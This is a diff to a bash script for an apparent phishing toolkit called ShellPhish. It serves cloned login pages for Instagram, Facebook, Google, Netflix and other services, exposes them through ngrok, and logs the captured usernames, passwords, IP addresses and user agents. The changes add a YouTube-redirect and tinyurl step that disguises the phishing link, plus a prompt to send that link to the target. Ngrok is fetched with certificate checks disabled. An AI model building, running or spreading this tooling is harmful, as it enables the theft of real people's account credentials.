@@ -17,7 +17,17 @@ sleep 0.5
 printf "."
 sleep 0.5
 printf "."
-sleep 1.5
+sleep 1
+printf "\e[0m\e[1;96m"
+clear
+printf "\n\e[0;91m>>> Must read \e[1;91mREADME.md\e[0;91m file before using this tool <<<\e[0m\n\e[1;92m\nTelegram Group   : \e[4;92mhttp://t.me/groupnahidhasanabir\e[0m\n\e[1;92mTelegram Channel : \e[4;92mhttp://t.me/teletechstore\e[0m\n\e[1;92mInstagram        : \e[4;92mhttps://instagram.com/AbirHasan2005\e[0m\n\e[1;92mTwitter          : \e[4;92mhttps://twitter.com/AbirHasan2005\n\n\e[0m\e[1;92mStarting "
+sleep 0.5
+printf "."
+sleep 0.5
+printf "."
+sleep 0.5
+printf "."
+sleep 1
 printf "\e[0m\e[1;96m"
 clear
 printf "\n\e[0;91m>>> Must read \e[1;91mREADME.md\e[0;91m file before using this tool <<<\e[0m\n\e[1;92m\nTelegram Group   : \e[4;92mhttp://t.me/groupnahidhasanabir\e[0m\n\e[1;92mTelegram Channel : \e[4;92mhttp://t.me/teletechstore\e[0m\n\e[1;92mInstagram        : \e[4;92mhttps://instagram.com/AbirHasan2005\e[0m\n\e[1;92mTwitter          : \e[4;92mhttps://twitter.com/AbirHasan2005\n\n\e[0m\e[1;92mStarting "
@@ -28,27 +38,56 @@ printf "."
 sleep 0.5
 printf "."
 sleep 1.5
-printf "\e[0m\e[1;96m"
 clear
-printf "\n\e[0;91m>>> Must read \e[1;91mREADME.md\e[0;91m file before using this tool <<<\e[0m\n\e[1;92m\nTelegram Group   : \e[4;92mhttp://t.me/groupnahidhasanabir\e[0m\n\e[1;92mTelegram Channel : \e[4;92mhttp://t.me/teletechstore\e[0m\n\e[1;92mInstagram        : \e[4;92mhttps://instagram.com/AbirHasan2005\e[0m\n\e[1;92mTwitter          : \e[4;92mhttps://twitter.com/AbirHasan2005\n\n\e[0m\e[1;92mStarting "
-sleep 0.5
-printf "."
-sleep 0.5
-printf "."
-sleep 0.5
-printf "."
-sleep 2.5
+printf "\nW"
+sleep 0.1
+printf "e"
+sleep 0.1
+printf "l"
+sleep 0.1
+printf "c"
+sleep 0.1
+printf "o"
+sleep 0.1
+printf "m"
+sleep 0.1
+printf "e "
+sleep 0.2
+printf "t"
+sleep 0.1
+printf "o "
+sleep 0.2
+printf "S"
+sleep 0.1
+printf "h"
+sleep 0.1
+printf "e"
+sleep 0.1
+printf "l"
+sleep 0.1
+printf "l"
+sleep 0.1
+printf "P"
+sleep 0.1
+printf "h"
+sleep 0.1
+printf "i"
+sleep 0.1
+printf "s"
+sleep 0.1
+printf "h"
+sleep 1
+
 printf "\e[0m\e[1;96m\n"
 clear
-
 
 trap 'printf "\n";stop;exit 1' 2
 
 
 dependencies() {
 
-command -v php > /dev/null 2>&1 || { printf >&2 "\e[0;91mPackage \e[0;95mPHP\e[0;91m is not installed ...\nAborting ..."; exit 1; }
-command -v curl > /dev/null 2>&1 || { printf >&2 "\e[0;91mPackage \e[0;95mCURL\e[0;91m is not installed ...\nAborting ..."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "package PHP is not installed ... Aborting ..."; exit 1; }
+command -v curl > /dev/null 2>&1 || { echo >&2 "package CURL is not installed ... Aborting ..."; exit 1; }
 
 }
 
@@ -57,12 +96,12 @@ menu() {
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m Origin\e[0m          \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Gitlab\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Steam\e[0m           \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m Pinterest\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Yahoo\e[0m           \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;93m Custom\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m        \e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m         \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;93m Run Setup for Termux\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m         \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Protonmail\e[0m      \e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m InstaFollowers\e[0m\n"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
+read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter a number: \e[0m' option
 
 
 if [[ $option == 1 || $option == 01 ]]; then
@@ -138,7 +177,21 @@ server="create"
 createpage
 start1
 
-elif [[ $option == 99 ]]; then
+elif [[ $option == 20 ]]; then
+clear
+printf "\n\e[1;92mRunning Termux Setup "
+sleep 0.5
+printf "."
+sleep 0.5
+printf "."
+sleep 0.5
+printf ".\n\e[1;92m"
+apt update && apt upgrade -y
+pkg install wget curl php unzip openssh -y
+printf "\n\e[1;92m Termux Setup Done ...\n\e[0m"
+
+elif [[ $option == 0 ]]; then
+printf "\n\e[1;91mAborting ...\e[0m\n"
 exit 1
 
 else
@@ -243,7 +296,7 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 printf "\n"
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting For IP and Next Credentials, Press Ctrl + C to exit ...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Next IP and Next Credentials, Press Ctrl + C to exit ...\e[0m\n"
 
 }
 
@@ -253,7 +306,7 @@ touch sites/$server/saved.usernames.txt
 ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
 cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
@@ -328,9 +381,10 @@ fi
 ##
 printf "\n"
 rm -rf iptracker.log
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting For Credentials and Next IP, Press Ctrl + C to exit ...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Credentials and Next IP, Press Ctrl + C to exit ...\e[0m\n"
 
 }
+
 
 
 serverx() {
@@ -338,7 +392,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server ...\n"
 cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server ...\e[0m\n"
-command -v ssh > /dev/null 2>&1 || { printf >&2 "\e[0;91mPackage \e[0;95mSSH\e[0;91m is not installed ...\nAborting ..."; exit 1; }
+command -v ssh > /dev/null 2>&1 || { echo >&2 "package SSH is not installed ... Aborting ..."; exit 1; }
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -348,7 +402,9 @@ sleep 10
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
-send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+
+send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$send_link" | head -n1)
+#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\n"
 checkfound
@@ -386,31 +442,30 @@ rm -rf sites/$server/usernames.txt
 fi
 
 
-
 if [[ -e ngrok ]]; then
 echo ""
 else
-command -v unzip > /dev/null 2>&1 || { printf >&2 "\e[0;91mPackage \e[0;95munzip\e[0;91m is not installed ...\nAborting ..."; exit 1; }
-command -v wget > /dev/null 2>&1 || { printf >&2 "\e[0;91mPackage \e[0;95mwget\e[0;91m is not installed ...\nAborting ..."; exit 1; }
+command -v unzip > /dev/null 2>&1 || { echo >&2 "package UNZIP is not installed ... Aborting ..."; exit 1; }
+command -v wget > /dev/null 2>&1 || { echo >&2 "package WGET is not installed ... Aborting ..."; exit 1; }
 printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok ...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
 else
-printf "\e[1;93m[!] Download error ... Termux, run:\e[0m\e[1;77m pkg install wget -y\e[0m\n"
+printf "\e[1;93m[!] Download error ... Termux, run:\e[0m\e[1;77m apt install wget\e[1;92m\n"
 exit 1
 fi
 
 
 
 else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
@@ -426,11 +481,16 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server ...\n"
 cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server ...\n"
-./ngrok http 3333 > /dev/null 2>&1 &
+./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
+send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
+#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+printf "\n"
+
 checkfound
 }
 
@@ -440,23 +500,23 @@ rm -rf sendlink
 fi
 
 
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunneling, Best!)\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok, Recommended!\e[0m\n"
-default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
-option_server="${option_server:-${default_option_server}}"
-if [[ $option_server == 1 || $option_server == 01 ]]; then
-startx
+#printf "\n"
+#printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net (SSH Tunneling, Best!)\e[0m\n"
+#printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok (Most Used, Recommended!)\e[0m\n"
+#default_option_server="1"
+#read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
+#option_server="${option_server:-${default_option_server}}"
+#if [[ $option_server == 1 || $option_server == 01 ]]; then
+#startx
 
-elif [[ $option_server == 2 || $option_server == 02 ]]; then
+#elif [[ $option_server == 2 || $option_server == 02 ]]; then
 start
-else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
-sleep 1
-clear
-start1
-fi
+#else
+#printf "\e[1;93m [!] Invalid option!\e[0m\n"
+#sleep 1
+#clear
+#start1
+#fi
 
 }
 checkfound() {
